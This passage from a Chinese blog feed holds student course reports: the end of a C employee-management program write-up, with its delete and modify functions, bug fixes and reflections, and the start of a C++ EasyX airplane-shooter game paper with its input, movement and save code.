*workers)&#x2F;&#x2F;删除数据；&#123;    struct workers *p;    int j;    struct workers read[100];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要删除的职工号&quot;);    scanf(&quot;%s&quot;,find);    for(j&#x3D;0; j&lt;&#x3D;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            NUM--;            &#x2F;&#x2F;将num--这个操作，更改变量的大小，方便再次存入。            break;        &#125;    &#125;    if(NUM&lt;j)        &#x2F;&#x2F;如果没有提前结束，j的最终大小回是num+1;判断num是否及时结束。    &#123;        printf(&quot;该职工号不存在！&quot;);        system(&quot;pause&quot;);    &#125;    if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)    &#123;        for(j; j&lt;NUM; j++)        &#123;            strcpy(read[j].jobNo,read[j+1].jobNo);            strcpy(read[j].name,read[j+1].name);            strcpy(read[j].sex,read[j+1].sex);            strcpy(read[j].position,read[j+1].position);            strcpy(read[j].year,read[j+1].year);            strcpy(read[j].salary,read[j+1].salary);            strcpy(read[j].addr,read[j+1].addr);            strcpy(read[j].tel,read[j+1].tel);        &#125;    &#125;&#x2F;&#x2F;将read[j]进行移位，达到删除的目的；    fclose(fp);&#x2F;&#x2F;关闭文件    char ch[10];    &#x2F;&#x2F;定义一个    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;删除失败！&quot;);        exit(EXIT_FAILURE);    &#125;    fwrite(read,sizeof(struct workers),NUM,fp);    fclose(fp);    FILE *fp1;    fp1&#x3D;fopen(&quot;data.txt&quot;,&quot;w+&quot;);    &#x2F;&#x2F;使用一个txt格式的文件作为辅助，进行数据量的计数。    itoa(NUM,ch, 10);    &#x2F;&#x2F;一个没学过的函数，把整形数转化成字符型；    fputs(ch,fp1);    fclose(fp1);    system(&quot;cls&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从二进制文件中将数据全部读取出来，将输入的员工号与已有数据中的员工号进行比对，当数据相同时删除该员工信息，并将全部信息重新写入文件中。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1 这一块程序是我做出来感觉遗憾最大的一块，在C语言实训最后的答辩中，我看到很多同学在删除这一块下足了功夫，我看到有的同学在删除前增加了是否删除的验证程序，也有的同学在这一块追加了密码输入，以验证执行删除功能的是否是管理员本人。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2 如果有时间，可以尝试增加一个撤销删除的功能，这个功能之前想过，可以令设一个结构体变量暂时存储删除的数据，如果执行撤销删除程序是，则把暂存结构体中的数据写入二进制文件中。<br>#####3.2.9修改员工信息</p><pre class="line-numbers language-none"><code class="language-none">void f_5(struct workers *workers)&#x2F;&#x2F;在文件中读取数据，对数据进行修改，最后在存入文件中。&#123;    struct workers *p;    int j;    struct workers read[NUM];    char find[10];    FILE *fp&#x3D;fopen(&quot;text.dat&quot;,&quot;rb&quot;);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件打开失败&quot;);        exit(EXIT_FAILURE);    &#125;    fread(read,sizeof(struct workers),NUM,fp);    printf(&quot;请输入要修改的职工号&quot;);    scanf(&quot;%s&quot;,find);    system(&quot;cls&quot;);    for(j&#x3D;0; j&lt;NUM; j++)    &#123;        if(strcmp(read[j].jobNo,find) &#x3D;&#x3D; 0)        &#123;            printf(&quot;\n\n\n\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   1.修改员工号                   2.修改姓名             ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   3.修改性别                     4.修改担任职务         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   5.修改年龄                     6.修改员工工资         ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t||   7.修改员工家庭住址             8.修改员工联系方式     ||\n&quot;);            printf(&quot;\t\t\t||                                                         ||\n&quot;);            printf(&quot;\t\t\t&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);            p &#x3D; (struct workers *)malloc(sizeof(struct workers));            p&#x3D;workers;            int n;            scanf(&quot;%d&quot;,&amp;n);            switch (n)            &#123;            case 1:                printf(&quot;请输入员工号:&quot;);                scanf(&quot;%s&quot;, read[j].jobNo);                break;            case 2:                printf(&quot;请输入姓名:&quot;);                scanf(&quot;%s&quot;,read[j].name);                break;            case 3:                printf(&quot;请输入性别:&quot;);                scanf(&quot;%s&quot;, read[j].sex);                break;            case 4:                printf(&quot;请输入所担任职务:&quot;);                scanf(&quot;%s&quot;, read[j].position);                break;            case 5:                printf(&quot;请输入年龄：&quot;);                scanf(&quot;%s&quot;,read[j].year);                break;            case 6:                printf(&quot;请输入工资:&quot;);                scanf(&quot;%s&quot;,read[j].salary);                break;            case 7:                printf(&quot;请输入家庭住址：&quot;);                scanf(&quot;%s&quot;,read[j].addr);                break;            case 8:                printf(&quot;请输入员工联系方式：&quot;);                scanf(&quot;%s&quot;,read[j].tel);                break;            &#125;        &#125;    &#125;&#x2F;&#x2F;以全部重新输入的形式去替换原本数据，达到修改的目的；    fclose(fp);    fp&#x3D;fopen(&quot;text.dat&quot;,&quot;wb+&quot;);    fwrite(read,sizeof(struct workers),NUM,fp);    if (fp&#x3D;&#x3D;NULL)    &#123;        printf(&quot;文件修改失败&quot;);        exit(EXIT_FAILURE);    &#125;    printf(&quot;修改成功！&quot;);    fclose(fp);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    Hollow();&#x2F;&#x2F;最后返回操作界面；&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块具体执行数据的修改，分成八个部分修改员工的各种信息。</p><h5 id="3-2-10退出程序"><a href="#3-2-10退出程序" class="headerlink" title="3.2.10退出程序"></a>3.2.10退出程序</h5><pre class="line-numbers language-none"><code class="language-none">int f_6(char n)&#x2F;&#x2F;退出程序；&#123;    printf(&quot;感谢您使用本系统，祝您工作愉快\n&quot;);    system(&quot;pause&quot;);    system(&quot;cls&quot;);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-漏洞分析与修复"><a href="#4-漏洞分析与修复" class="headerlink" title="4.漏洞分析与修复"></a>4.漏洞分析与修复</h2><p>在整个C语言实训中，我不断的制造大大小小的bug，同时也在不断的修复这些bug，以下是我在这个C语言实训中遇到的一些问题。<br>1.起初我对删除文件信息的设计存在无法修复的缺陷，起初的设想是用空格字符串去换结构体数组中的每一项字符串，但做出来，再次浏览时发现位置被空格字符串占据，尝试修改这个被空格占据的结构体，发现无法继续对该位置进行操作，最终决定放弃该思路。<br>2.在浏览全部数据时难以判断存入数据多少；在老师的指导下采用了一个txt文件作为辅助，这一点极其关键，我的这串代码如果缺少了作为辅助的文本文件data.txt实际上是无法运行的，但同时我的程序中也没有代码块，包含对该辅助文件的创建，只有对改文件进行更新，意味着使用改系统，必须手动创建一个文本文件data.txt<br>3.文本文件的读写，将文本文件的信息读入程序时发现存在问题，在文本文件中是以字符型的一个个数字，而在程序中使用我需要的是一个整形数，最后百度找到了一个函数atoi就这个将字符型数转化成整形<br>4.同上一个问题在写入时也有这个问题，然后就找到了一个函数将int类型转化成char数组。<br>5.在添加员工的过程中，一开始使用了wb+却没注意到，发现数据一直存不进去。之后看到打开方式，改成ab+就没问题了。<br>6.在员工登录，执行完查询程序后，意外弹出了管理员的页面，检查程序发现是起初按管理员模式写的操作页面被镶嵌到每一个功能块的最后，而员工直接调用管理员的查询函数照成了该故障，故重写了一个更改过的查询函数，用在员工页面。<br>7.在使用工程解决的时候因为对文件引用不太了解出现了一堆问题，修复了半天。<br>8.其实在查询的时候那个格式真的很难弄，一开始的思路存在问题，起初是根据第一个存入的数据大小更改页面的大小，但是发现只要输入的数据发生改变，就会导致格式不在规范，最后则是由%nd的形式规范</p><h2 id="5-总结反思"><a href="#5-总结反思" class="headerlink" title="5.总结反思"></a>5.总结反思</h2><p>由于我们的C语言的实训，由于开课比较早，专业课没有结束，做项目需要的结构体的知识和文件调用的知识并没有学，最初做起来也是非常困难，利用互联网去查询如何实现文件调用，去看网络上其他人做到程序，通过种种方式去学习这些内容，对我们组每一位组员的自我学习能力都是一个巨大的提高。<br>另一个体会是规划的重要性，我们一开始程序设计分析的时候对规划做得并不好，很多程序功能都是后面有了构思后补充的，如果会进行下一次的实训，系统的构思一定要做好。<br>    生活中我们习以为常的小问题，我们看似毫无新意的小程序，由我们自己实施起来却困难重重，大家都喜欢开程序员的玩笑，说,你怎么还不秃顶。看似调侃却透露出编程的不易，而属于我们的一切才刚刚开始，实训当然是挺难的，没有接触的函数，细小的失误，复杂的逻辑，但所幸我们成功地站在了这里。我们从中吸取了许多教训，我们对以后的学习和生活有了更多的了解。</p><blockquote><p>这是最好的时代，这是最坏的时代，我们仍然年轻，我们仍然伫立。——–致所有在座的各位。</p></blockquote><h2 id="6收获"><a href="#6收获" class="headerlink" title="6收获"></a>6收获</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实训真的带给我们很多提高，使用的很多函数都是课上没有讲过的，而这里调了一些展示出来</p><blockquote><p>system(“pause”);暂停函数，避免程序运行跳转太快而无法看清数据。<br>system(“cls”);清屏函数，清楚屏幕上的信息，方便程序展示。<br>atoi（）函数将char类型数转化为int类型的数。<br>itoa（）函数将int类型的变量转化为字符串。<br>Sleep（）函数来自Windows.h中的函数，让程序延迟一段时间，登录系统的动画就是应用了该函数<br>fflush(stdin)函数，清空缓冲器，方便后续的文件读写</p></blockquote><p>在其他的方面，如小组合作，自我学习能力，从网络上获取知识的能力都得到显著的提高。</p><h2 id="7-程序演示"><a href="#7-程序演示" class="headerlink" title="7.程序演示"></a>7.程序演示</h2><h2 id="8-鸣谢"><a href="#8-鸣谢" class="headerlink" title="8.鸣谢"></a>8.鸣谢</h2><p>感谢我们大一的C语言黄老师，及负责我们C语言实训的任老师，及协助我完成实训工作的两位同组同学。</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 课程论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>课程论文：基于C++的可视化飞机大战游戏</title>
      <link href="/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/"/>
      <url>/2021/07/31/%E5%9F%BA%E4%BA%8EC++%E7%9A%84%E5%8F%AF%E8%A7%86%E5%8C%96%E9%A3%9E%E6%9C%BA%E5%A4%A7%E6%88%98%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<hr><p>摘要： 飞机大战是一款经典的游戏，最早应追溯到打击者1945（Strikers 1945），这是日本彩京公司于1995年发售的飞行射击游戏。本作是参照打击者1945基于visual C++写成的飞行射击类游戏。本作中实现了敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能,而且通过文件读写的相关操作完成了存档与读档的相关操作。本作通过便捷的操作方式，使玩家可以轻易地上手该游戏，在游戏中放松心情，释放压力，提高反应能力。游玩该游戏可以为玩家带来欢乐。</p><hr><p>关键词： 可视化 飞机大战 游戏设计</p><p>引言 随着社会的不断发展，人们的生活方式也不断的在变化，人们的娱乐方式也越发的多种多样。人们对美好生活的向往，不单单局限于物质生活，人们的精神生活也在一天天的丰富。游戏是很多人精神生活中的一种重要组成部分。毫无疑问飞机大战是一款极其经典的游戏，玩家通过鼠标或键盘操作飞机攻击敌方飞机，躲避碰撞和敌方飞机攻击。极其简单的操作和轻松的上手，使得这一款游戏带给了无数人欢乐。</p><h4 id="1-需求分析"><a href="#1-需求分析" class="headerlink" title="1 需求分析"></a>1 需求分析</h4><p>在飞行射击类游戏中，玩家登陆游戏后可以通过鼠标或键盘操作飞机前进，躲避敌机攻击，并通过点击鼠标左键或空格键发射子弹击败敌机。</p><p>完成这个飞机大战游戏的设计，需要完成用户飞机的移动功能，敌机的产生功能、子弹的发射功能、飞机中弹销毁和计算得分等功能。在用户需要时可以暂停游戏，可以通过文件读写完成存档与读档。为丰富游戏的趣味性，相应增加了各种音效，并会根据用户的得分产生相应的敌机。</p><h4 id="2-关键技术"><a href="#2-关键技术" class="headerlink" title="2 关键技术"></a>2 关键技术</h4><h5 id="2-1-C-面向对象的程序设计"><a href="#2-1-C-面向对象的程序设计" class="headerlink" title="2.1 C++面向对象的程序设计"></a>2.1 C++面向对象的程序设计</h5><p>C++起始于C语言。当C语言发展到巅峰时出现了增加关键词和类的C with class的C语言版本，而这是C语言的一大突破，开发者将这一种语言命名为C++。这便是C++最早的版本。</p><blockquote><p>美国AT&amp;T贝尔实验室的本贾尼·斯特劳斯特鲁普博士在20世纪80年代初期成功地实现了C++，即C with classes。当时C++是作为C语言的加强版本出现，从给C增加类开始，不断增加新的特征<sup>[1]</sup>。</p></blockquote><p>然而就目前而言，C++可以认为它是一门独立的编程语言，它源于C语言但是它并不依赖于C语言。C++与C语言也是有本质差别：在于C++是面向对象的，而C语言是面向过程的。或者说C++是在C语言的基础上增加了面向对象程序设计的新内容，是对C语言的一次更重要的改革，使得C++成为软件开发的重要工具。</p><h5 id="2-2-C-语言的优点"><a href="#2-2-C-语言的优点" class="headerlink" title="2.2 C++语言的优点"></a>2.2 C++语言的优点</h5><ul><li>在C语言的基础上进行扩充和完善，使C++兼容了C语言的面向过程特点，又成为了一种面向对象的程序设计语言</li><li>可以使用抽象数据类型进行基于对象的编程</li><li>可以使用多继承、多态进行面向对象的编程</li><li>可以担负起以模版为特征的泛型化编程    </li><li>C++实现了面向对象程序设计。在高级语言当中，处理运行速度是最快的，大部分的游戏软件，系统都是由C++来编写的</li><li>C++语言非常灵活，功能非常强大。如果说C语言的优点是指针，那么C++的优点就是性能和类层次结构的设计</li><li>C++非常严谨、精确和数理化，标准定义很细致</li><li>C++语言的语法思路层次分明、相呼应;语法结构是显式的、明确的</li></ul><h5 id="2-3-Visual-C-的优点"><a href="#2-3-Visual-C-的优点" class="headerlink" title="2.3 Visual C++的优点"></a>2.3 Visual C++的优点</h5><p>（1）与Windows紧密结合，MFC类库集成了大量已经预先定义好的类，用户可以根据编程的需要定义相应的类，或根据需要自己定义相应的类。因此Visual C++在使用API等方面和Windows联系的最为紧密<sup>[</sup><sup>2]</sup>。</p><p>（2）强大的类库支持和类改造能力。代码重用是C++追求的目标，重用就是从已有的基类派生出新的C++类；MFC提供了大量的基类供程序员们根据不同的应用要求生成新的类以满足要求。VC++有了MFC，具有非常强大对类改造的能力。只要集成MFC类，稍加修改就可以得到符合要求的控件类或应用类。</p><p>（3）拥有高效的运行速度。高的运行速度取决于两点：1.软件本身编写的质量，2.编程工具的编译质量。因为VC++非常接近Windows底层，所以编译器所编译的质量相当高，从而保证了VC++编写出来的软件产品拥有高效的运行速度<sup>[</sup><sup>3]</sup>。</p><h5 id="2-4-C-的语言体系"><a href="#2-4-C-的语言体系" class="headerlink" title="2.4 C++的语言体系"></a>2.4 C++的语言体系</h5><p>（1）C子语言。C++是以C语言为基础，C++几乎支持C语言的全部功能。</p><p>（2）面向对象的C++。C++首先是一门面向对象的程序设计语言，并以此闻名。</p><p>（3） 泛型编程语言。相比C语言，C++增加了模板，C++强大的模板功能使系统能够在编译期间就能完成许多工作，从而大大提高了运行效率<sup>[</sup><sup>4]</sup>。</p><p>（4）STL。随着STL的不断发展，渐渐成为C++程序设计体系中不可或缺的一部分。其安全性与规范性的优秀使得它受到程序员的欢迎<sup>[</sup><sup>1]</sup>。</p><h4 id="3-游戏总体设计"><a href="#3-游戏总体设计" class="headerlink" title="3.游戏总体设计"></a>3.游戏总体设计</h4><p>游戏被分成两个部分，一部分是与用户输入有关的更新，包括根据鼠标位置或键盘按键进行飞机的移动和炮弹发射等等。另一部分是与用户输入无关的更新，包括子弹移动，敌机移动逻辑等判断。图1为飞机大战程序设计图。</p><img src=".\基于C++的可视化飞机大战游戏\飞机大战程序设计图.png" style="zoom:50%;" /><center>图1 飞机大战程序设计图</center><h4 id="4-游戏功能实现"><a href="#4-游戏功能实现" class="headerlink" title="4 游戏功能实现"></a>4 游戏功能实现</h4><h5 id="4-1-代码设计"><a href="#4-1-代码设计" class="headerlink" title="4.1 代码设计"></a>4.1 代码设计</h5><p>4.1.1 头文件</p><ol><li>#include<iostream>头文件，包含头文件输入输出流，c++中没有c语言中输入输出语句，而是利用数据流来解决这个问题。要使用比如cout,cin语句输入输出函数。其中#include文件的目的是把多个编译单元公用的内容单独放在一个文件里减少整体代码尺寸，或者提供可跨工程使用的公共代码；</li><li>#include <fstream>头文件#include 是C++的预编译语句，作用是包含对应的文件，在这里是包含C++的STL头文件fstream。在包含了这个文件后，就可以使用fstream中定义的类及各种成员函数了。fstream是C++ STL中对文件操作的合集，包含了常用的所有文件操作。在C++中，所有的文件操作，都是以流(stream)的方式进行的，fstream也就是文件流file stream<sup>[</sup><sup>5]</sup>。</li><li>#include<iomanip>头文件,这个头文件是声明一些 “流操作符”的，比较常用的setw(int);//设置显示宽度、left//right//设置左右对齐、setprecision(int);//设置浮点数的精确度。</li><li>#include<fstream>包含读写文件头文件，实际上是一个输出流的类模板，含有ifstream和ofstream两个派生类。</li><li>#include &lt;math.h&gt; 是包含math头文件的意思，math.h头文件中声明了常用的一些数学运算，比如乘方，开方运算等等。</li><li>#include&lt;graphics.h&gt;头文件是C语言和visual studio的图形库文件，包含像素函数、线型函数、画线函数、相对画线函数等多种函数，可进行图形的快速编程。这也是实现可视化的最重要工具。使用easyx.exe，可以直接运行安装图形库到visual studio。然后直接使用</li><li>#include&lt;windows.h&gt;头文件是最重要的头文件之一，它包含了其他Windows头文件，这些头文件也包含了其他头文件，其中有用户界面函数&lt;Winuser.h&gt;、图形设备接口函数&lt;Wingdi.h&gt;<sup>[</sup><sup>6]</sup></li><li>#include&lt;conio.h&gt;是Console Input/Output（控制台输入输出）的简写，其中定义了通过控制台进行数据输入和数据输出的函数，主要是一些用户通过按键盘产生的对应操作，比如getch()函数等等<sup>[</sup><sup>4]</sup></li><li>#pragma comment(lib,”Winmm.lib”)声明程序使用了winmm.lib库，这个库是是Windows多媒体相关应用程序接口，用于低档的音频和游戏手柄。可以用来实现音频的添加和利用。在该飞机大战程序中这个库中的内容实现了游戏运行时中的背景音乐的开始和结束放映等功能</li></ol><p>4.1.2使用函数</p><ul><li>settextstyle() 设置文本型式函数，函数settextstyle() 设置图形文本当前字体、文本显示方向（水平显示或垂直显示）以及字符大小。在使用中用于显示得分和成绩。通常与Outtextxy配套使用。</li><li>Outtextxy()函数，这个函数用于在指定位置输出字符串</li><li>loadimageLoadImage()函数，功能是装载图标，光标，或位图。在本程序中用于加载图片</li><li>Initgraph()函数功能为初始化图形系统。pathtodriver表示存放图形驱动文件的路径</li><li>SetTextColor()，Windows API 函数，设置指定DC中的文字颜色</li><li>kbhit()是一个C和C++函数，用于非阻塞地响应键盘输入事件。其中文可译为“键盘敲击”(keyboard hit)，注意这个函数在高版本VC下已被淘汰，应使用_kbhit()函数</li><li>MouseHit()函数是实现鼠标操作最关键的函数，用于判断是否有鼠标信息。<sup>[</sup><sup>5]</sup>使用MouseHit()函数效果与kbhit()函数效果类似，如果没有鼠标信息自动跳过。避免了因为没有鼠标信息导致程序无法运行的状况<sup>[7]</sup></li><li>getch()是编程中所用的函数，这个函数是一个不回显函数，当用户按下某个字符时，函数自动读取，无需按回车，有的C语言命令行程序会用到此函数做游戏，但是这个函数并非标准函数。在高版本VC或者VS中已经无法使用应该使用_getch()函数<sup>[8]</sup></li><li>SetBkMode()函数这就需要使用SetBkMode函数来设置DrawText函数的输出方式，显示设备共有两种输出方式：OPAQUE和TRANSPARENT。OPAQUE的方式是用当前背景的画刷的颜色输出显示文字的背景，而TRANSPARENT是使用透明的输出，也就是文字的背景是不改变的。</li><li>MCI (Media Control Interface，媒体控制接口) 函数中，有些只适用于一种接口方式，有些则两种接口都可以用。mciSendString只适用于命令串接口方式（命令串中不区分大小写）以形如mciSendString(“play movie”,buf,sizeof(buf),NULL);的方式进行音频播放，以形如mciSendString(“pause movie”,buf,sizeof(buf),NULL);的方式暂停播放。以形如mciSendString(“close movie”,buf,sizeof(buf),NULL)的形式关闭播放。</li></ul><h5 id="4-2操作逻辑"><a href="#4-2操作逻辑" class="headerlink" title="4.2操作逻辑"></a>4.2操作逻辑</h5><p>本程序使用两种操作方式，依靠键盘按键操作和依靠鼠标位置进行操作。图2为飞机移动操作逻辑示意图。</p><img src=".\基于C++的可视化飞机大战游戏\飞机移动操作逻辑示意图.png" style="zoom:80%;" /><center>图2 飞机移动操作逻辑示意图</center>使用鼠标操作代码如下：<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (isExpolde &#x3D;&#x3D; 0)&#123;    MOUSEMSG m;    while (MouseHit())    &#123;        m &#x3D; GetMouseMsg();        if(m.uMsg &#x3D;&#x3D; WM_MOUSEMOVE)        &#123;            position_x &#x3D; m.x;            position_y &#x3D; m.y;        &#125;        else if (m.uMsg &#x3D;&#x3D; WM_LBUTTONDOWN)        &#123;            bullet_x &#x3D; position_x;            bullet_y &#x3D; position_y - 85;        &#125;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的使用键盘操作代码为：</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">char input;if (_kbhit())  &#x2F;&#x2F; 判断是否有输入&#123;    input &#x3D; _getch();  &#x2F;&#x2F; 根据用户的不同输入来移动，不必输入回车    if (input &#x3D;&#x3D; 27) &#x2F;&#x2F; ESC键的ACSII码为27        gameStatus &#x3D; 3;    if (input &#x3D;&#x3D; &#39;a&#39;)        position_x -&#x3D; 10;    if (input &#x3D;&#x3D; &#39;d&#39;)        position_x +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;w&#39;)        position_y +&#x3D; 10;    if (input &#x3D;&#x3D; &#39;s&#39;)        position_y -&#x3D; 10;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先定义MOUSEMSG的鼠标类型参数m;通过while (MouseHit()) 进行操作，既能保证能够使用鼠标进行操作也避免了，在没有鼠标操作时游戏的停止。</p><p>类似的有定义char 类型的的变量通过while(_kbhit())来进行是否有键盘信息的判断，用_getch()函数获取键盘的敲击值。</p><h5 id="4-3-与用户输出无关的逻辑"><a href="#4-3-与用户输出无关的逻辑" class="headerlink" title="4.3 与用户输出无关的逻辑"></a>4.3 与用户输出无关的逻辑</h5><p>4.3.1 敌机生成逻辑</p><p>使用rand()函数生成一个最大为32767的数，并通过%(Width-50)得到飞机的初始坐标，并同时将blood等参数复原。</p><p>4.3.2 敌机简单移动逻辑<br>代码如下:</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if (enemy_y &lt; High - 25)&#123;    if (enemy_x &#x3D;&#x3D; 0)        flag &#x3D; 0;    if (enemy_x &#x3D;&#x3D; 500)        flag &#x3D; 1;    enemy_y &#x3D; enemy_y + 1;    if (flag &#x3D;&#x3D; 1)        enemy_x &#x3D; enemy_x--;    else enemy_x &#x3D; enemy_x++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该模块通过定义全局变量static flag 进行操控飞机的飞行方向，同时在每个循环过程中使飞机能够实现摆动下降。</p><h5 id="4-4暂停页面与存储逻辑"><a href="#4-4暂停页面与存储逻辑" class="headerlink" title="4.4暂停页面与存储逻辑"></a>4.4暂停页面与存储逻辑</h5><p>通过_getch()函数读取输入，如存在按键为Esc时，将gameStatus设置为3，出现暂停页面，图3为游戏暂停页面。<br>图3 游戏暂停页面<br>游戏数据储存逻辑</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">void read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ifstream file2<span class="token punctuation">;</span><span class="token operator">//</span>输入指针    file2<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"../data.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    file2 <span class="token operator">>></span> position_x <span class="token operator">>></span> position_y <span class="token operator">>></span> bullet_x <span class="token operator">>></span> enemy_x <span class="token operator">>></span> enemy_y <span class="token operator">>></span> isExpolde <span class="token operator">>></span> score<span class="token punctuation">;</span>    file2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>void write<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    ofstream file1<span class="token punctuation">;</span>    file1<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./data.txt"</span><span class="token punctuation">,</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>ios<span class="token punctuation">:</span><span class="token punctuation">:</span>app<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>!file1<span class="token punctuation">.</span>is_open<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        std<span class="token punctuation">:</span><span class="token punctuation">:</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">"打开文件失败！！\n"</span><span class="token punctuation">;</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    file1 <span class="token operator">&lt;&lt;</span> position_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> position_y <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> bullet_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_x <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> enemy_y <span class="token operator">&lt;&lt;</span><span class="token string">" "</span> <span class="token operator">&lt;&lt;</span> isExpolde <span class="token operator">&lt;&lt;</span><span 